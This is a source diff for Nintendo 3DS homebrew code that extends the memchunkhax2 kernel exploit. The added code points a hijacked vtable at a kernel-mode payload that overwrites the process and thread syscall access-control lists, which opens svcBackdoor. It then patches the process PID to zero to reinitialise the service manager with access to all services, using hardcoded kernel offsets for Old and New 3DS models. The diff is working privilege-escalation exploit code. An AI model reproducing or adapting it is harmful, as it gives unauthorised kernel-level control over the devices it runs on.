@@ -13,6 +13,21 @@
 
 #define PAGE_SIZE 0x1000
 
+#define OLDNEW(x) (isNew3DS ? x ## _NEW : x ## _OLD)
+
+#define CURRENT_KTHREAD (*((u8**)0xFFFF9000))
+#define CURRENT_KPROCESS (*((u8**)0xFFFF9004))
+#define SVC_ACL_SIZE 0x10
+
+#define KPROCESS_ACL_START_OLD 0x88
+#define KPROCESS_ACL_START_NEW 0x90
+
+#define KPROCESS_PID_OFFSET_OLD 0xB4
+#define KPROCESS_PID_OFFSET_NEW 0xBC
+
+#define KTHREAD_THREADPAGEPTR_OFFSET 0x8C
+#define KSVCTHREADAREA_BEGIN_OFFSET 0xC8
+
 typedef struct {
     u32 size;
     void* next;
@@ -28,10 +43,81 @@ typedef struct {
 extern u32 __ctru_heap;
 extern u32 __ctru_heap_size;
 
-volatile u32 testVal = 0;
+volatile u32 exploitStage = 0;
 
-static void kernel_entry() {
-    testVal = 0xDEADCAFE;
+u8 isNew3DS = 0;
+u32 originalPid = 0;
+
+// Calling printf() from svc mode code is incredibly unstable, so here's a lame debug buffer.
+char debugBuf[2048] = {0};
+#define DEBUGBUF_NEXT ((char*)(strlen(debugBuf) + debugBuf))
+static void debugbuf_out() {
+    puts(debugBuf);
+    memset(debugBuf, 0, sizeof(debugBuf));
+}
+
+// Patching the pid allows us to reinitialize the service manager and obtain access to all services.
+// This idea was shamelessly stolen from previous implementations (particularly libkhax).
+// Retrieves the current PID.
+static u32 km_get_process_pid() {
+    u8 *proc = (u8*)CURRENT_KPROCESS;
+    u32 *pidPtr = (u32*)(proc + OLDNEW(KPROCESS_PID_OFFSET));
+    return *pidPtr;
+}
+
+// Patches our process PID to the given pid value.
+static void km_patch_process_pid(u32 pid_val) {
+    u8 *proc = (u8*)CURRENT_KPROCESS;
+    u32 *pidPtr = (u32*)(proc + OLDNEW(KPROCESS_PID_OFFSET));
+    *pidPtr = pid_val;
+}
+
+// This is where the vtable points. Unlocks the process & thread ACLs.
+static void km_stage1() {
+    // Patch the process first (for newly created threads).
+    u8 *proc = (u8*)CURRENT_KPROCESS;
+    sprintf(DEBUGBUF_NEXT, "proc at %p\n", proc);
+    u8 *procacl = proc + OLDNEW(KPROCESS_ACL_START);
+    memset(procacl, 0xFF, SVC_ACL_SIZE);
+    sprintf(DEBUGBUF_NEXT, "proc svc acl overwritten\n");
+
+    // Now patch the current thread.
+    u8 *thread = (u8*)CURRENT_KTHREAD;
+    sprintf(DEBUGBUF_NEXT, "thread at %p\n", thread);
+    u8 *thread_pageend = (u8*)(*(u8**)(thread + KTHREAD_THREADPAGEPTR_OFFSET));
+    sprintf(DEBUGBUF_NEXT, "thread pageend at %p\n", thread_pageend);
+    u8 *thread_page = thread_pageend - KSVCTHREADAREA_BEGIN_OFFSET;
+    memset(thread_page, 0xFF, SVC_ACL_SIZE);
+    
+    // Running this code means we have svcBackdoor, and we should tell the main function we ran.
+    // There's no easy way to directly return a value through this exploit, so pass it on globally.
+    exploitStage = 1;
+}
+
+// Set the process PID to 0. When we reinitialize the service manager as 0, we'll get all the services.
+static s32 kmbackdoor_pid_zero(void) {
+    // Turn interrupts off
+    __asm__ volatile("cpsid aif");
+    
+    originalPid = km_get_process_pid();
+    sprintf(DEBUGBUF_NEXT, "old pid is %lu\n", originalPid);
+    km_patch_process_pid(0);
+    sprintf(DEBUGBUF_NEXT, "patched pid is %lu\n", km_get_process_pid());
+    
+    // We're now PID zero, all we have to do is reinitialize the service manager in user-mode.
+    return 0;
+}
+
+// Reset the process PID to what it was. Unsure if this has any real impact.
+static s32 kmbackdoor_pid_reset(void) {
+    __asm__ volatile("cpsid aif");
+    
+    sprintf(DEBUGBUF_NEXT, "old pid is %lu\n", km_get_process_pid());
+    km_patch_process_pid(originalPid);
+    sprintf(DEBUGBUF_NEXT, "patched pid is %lu\n", km_get_process_pid());
+
+    // Back to normal.
+    return 0;
 }
 
 // Thread function to slow down svcControlMemory execution.
@@ -67,9 +153,9 @@ static Result __attribute__((naked)) svcCreateEventKAddr(Handle* event, u8 reset
 }
 
 // Executes exploit.
-void execute_memchunkhax2() {
+static u8 memchunkhax2_exploit() {
     printf("Setting up...\n");
-
+    
     // Set up variables.
     Handle arbiter = __sync_get_arbiter();
     AllocateData* data = (AllocateData*) malloc(sizeof(AllocateData));
@@ -80,7 +166,7 @@ void execute_memchunkhax2() {
     Handle kObjHandle = 0;
     u32 kObjAddr = 0;
     Thread delayThread = NULL;
-
+    
     if(data == NULL) {
         printf("Failed to create allocate data.\n");
         goto cleanup;
@@ -101,7 +187,7 @@ void execute_memchunkhax2() {
     data->result = -1;
 
     for(int i = 0; i < 16; i++) {
-        vtable[i] = kernel_entry;
+        vtable[i] = km_stage1;
     }
 
     aptOpenSession();
@@ -109,6 +195,10 @@ void execute_memchunkhax2() {
         printf("Failed to allow threads on core 1.\n");
         goto cleanup;
     }
+    
+    // Figure out if this is a N3DS so that we can use the right KProcess offsets later.
+    APT_CheckNew3DS(&isNew3DS);
+    printf("System type: %s\n", isNew3DS ? "New" : "Old");
 
     aptCloseSession();
 
@@ -237,6 +327,38 @@ cleanup:
     if(vtable != NULL) {
         linearFree(vtable);
     }
+    
+    // We assume success if the exploitStage was successfully modified by the initial execution.
+    return exploitStage >= 1;
+}
 
-    printf("Test value: %08X\n", (int) testVal);
+// Performs a simple PID zero based service unlock provided access to svcBackdoor.
+static u8 memchunkhax2_service_unlock() {
+    debugbuf_out();
+
+    printf("Calling backdoor\n");
+    svcBackdoor(kmbackdoor_pid_zero);
+    debugbuf_out();
+
+    printf("Reinitializing srv\n");
+    srvExit();
+    srvInit();
+    printf("srv reinitialized.\n");
+
+    svcBackdoor(kmbackdoor_pid_reset);
+    debugbuf_out();
+    
+    return 1;
+}
+
+// Wrapper function - performs both the initial kernel write exploit and the service unlock.
+u8 execute_memchunkhax2() {
+    if(memchunkhax2_exploit()) {
+        printf("Initial exploit ok.\n");
+        if(memchunkhax2_service_unlock()) {
+            printf("Service unlock ok.\n");
+            return 1;
+        }
+    }
+    return 0;
 }
